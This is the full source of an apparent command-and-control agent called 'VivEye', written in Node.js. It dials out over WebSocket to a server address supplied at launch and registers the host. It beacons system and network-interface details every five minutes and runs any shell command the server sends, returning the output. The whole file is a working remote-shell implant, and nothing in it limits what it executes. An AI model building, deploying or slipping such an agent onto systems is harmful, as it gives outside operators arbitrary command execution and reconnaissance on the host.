const WebSocket = require('ws');
const { exec } = require('child_process');
const os = require('os');

class VivEyeAgent {
  constructor(serverUrl) {
    this.serverUrl = serverUrl;
    this.ws = null;
    this.agentId = 'agent-' + Math.random().toString(36).substr(2, 9);
    this.beaconInterval = 300000; // 5 minutes
    this.beaconTimer = null;
    this.reconnectInterval = 5000; // 5 seconds
    this.maxReconnectAttempts = 10;
    this.reconnectAttempts = 0;
  }

  // Smart connection method that detects HTTP/HTTPS
  connect() {
    let wsUrl = this.serverUrl;
    
    // Auto-detect protocol if not specified
    if (!wsUrl.startsWith('ws://') && !wsUrl.startsWith('wss://')) {
      // Check if it's a domain or IP
      if (wsUrl.includes('.') && !wsUrl.match(/^\d+\.\d+\.\d+\.\d+$/)) {
        // It's a domain, use WSS for HTTPS
        wsUrl = `wss://${wsUrl}/ws`;
      } else {
        // It's an IP, try WSS first, fallback to WS
        wsUrl = `wss://${wsUrl}/ws`;
      }
    }
    
    console.log(`Attempting to connect to: ${wsUrl}`);
    
    try {
      this.ws = new WebSocket(wsUrl);
      this.setupEventHandlers();
    } catch (error) {
      console.error('Connection error:', error.message);
      this.handleConnectionError();
    }
  }

  setupEventHandlers() {
    this.ws.on('open', () => {
      console.log('Connected to VivEye server');
      this.reconnectAttempts = 0;
      this.register();
      this.startBeacon();
    });

    this.ws.on('message', (data) => {
      try {
        const command = JSON.parse(data);
        this.executeCommand(command);
      } catch (error) {
        console.error('Error parsing message:', error.message);
      }
    });

    this.ws.on('close', (code, reason) => {
      console.log(`Connection closed: ${code} - ${reason}`);
      this.handleConnectionError();
    });

    this.ws.on('error', (error) => {
      console.error('WebSocket error:', error.message);
      this.handleConnectionError();
    });
  }

  handleConnectionError() {
    if (this.reconnectAttempts < this.maxReconnectAttempts) {
      this.reconnectAttempts++;
      console.log(`Reconnection attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts} in ${this.reconnectInterval/1000} seconds...`);
      
      setTimeout(() => {
        this.connect();
      }, this.reconnectInterval);
    } else {
      console.error('Max reconnection attempts reached. Please check your server configuration.');
      process.exit(1);
    }
  }

  register() {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({
        type: 'agent-register',
        agentId: this.agentId,
        name: 'Smart VivEye Agent',
        os: os.platform(),
        arch: os.arch(),
        hostname: os.hostname(),
        version: '2.0.0'
      }));
    }
  }

  startBeacon() {
    if (this.beaconTimer) {
      clearInterval(this.beaconTimer);
    }
    
    this.beaconTimer = setInterval(() => {
      this.sendBeacon();
    }, this.beaconInterval);
  }

  sendBeacon() {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      const beaconData = {
        type: 'beacon',
        agentId: this.agentId,
        timestamp: new Date().toISOString(),
        systemInfo: {
          platform: os.platform(),
          arch: os.arch(),
          uptime: os.uptime(),
          memory: process.memoryUsage(),
          cpu: process.cpuUsage(),
          hostname: os.hostname(),
          networkInterfaces: os.networkInterfaces()
        }
      };
      
      this.ws.send(JSON.stringify(beaconData));
      console.log('Beacon sent:', new Date().toISOString());
    }
  }

  async executeCommand(command) {
    try {
      console.log(`Executing command: ${command.payload}`);
      const result = await this.runCommand(command.payload);
      
      this.ws.send(JSON.stringify({
        type: 'command-result',
        commandId: command.id,
        result: result,
        status: 'completed',
        timestamp: new Date().toISOString()
      }));
    } catch (error) {
      this.ws.send(JSON.stringify({
        type: 'command-result',
        commandId: command.id,
        result: error.message,
        status: 'failed',
        timestamp: new Date().toISOString()
      }));
    }
  }

  runCommand(cmd) {
    return new Promise((resolve, reject) => {
      exec(cmd, { timeout: 30000 }, (error, stdout, stderr) => {
        if (error) {
          reject(new Error(`Command failed: ${error.message}`));
        } else if (stderr) {
          resolve(`STDOUT:\n${stdout}\nSTDERR:\n${stderr}`);
        } else {
          resolve(stdout);
        }
      });
    });
  }

  stopBeacon() {
    if (this.beaconTimer) {
      clearInterval(this.beaconTimer);
      this.beaconTimer = null;
    }
  }

  disconnect() {
    this.stopBeacon();
    if (this.ws) {
      this.ws.close();
    }
  }
}

// Get server address from command line or prompt
const serverAddress = process.argv[2] || process.env.VIVEYE_SERVER;

if (!serverAddress) {
  console.log('Usage: node smart-agent.js <server-address>');
  console.log('Example: node smart-agent.js viveye.yourdomain.com');
  console.log('Example: node smart-agent.js 192.168.1.100');
  process.exit(1);
}

const agent = new VivEyeAgent(serverAddress);

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\nShutting down agent...');
  agent.disconnect();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\nShutting down agent...');
  agent.disconnect();
  process.exit(0);
});

// Start the agent
agent.connect();
